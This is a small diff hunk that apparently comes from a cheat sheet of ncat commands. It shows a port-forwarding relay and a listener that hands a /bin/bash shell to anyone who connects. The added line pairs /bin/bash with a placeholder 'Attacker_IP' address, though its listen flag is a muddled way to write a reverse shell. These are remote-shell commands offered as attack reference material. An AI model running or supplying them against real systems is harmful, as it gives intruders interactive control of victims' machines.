@@ -997,6 +997,8 @@ ncat -lvnp 443 -c "ncat TARGET_SERVER 25"
 
 ncat -lvnp PORT_NUMBER -e /bin/bash
 
+ncat -lvnp Attacker_IP PORT_NUM -e /bin/bash
+
 
 
 
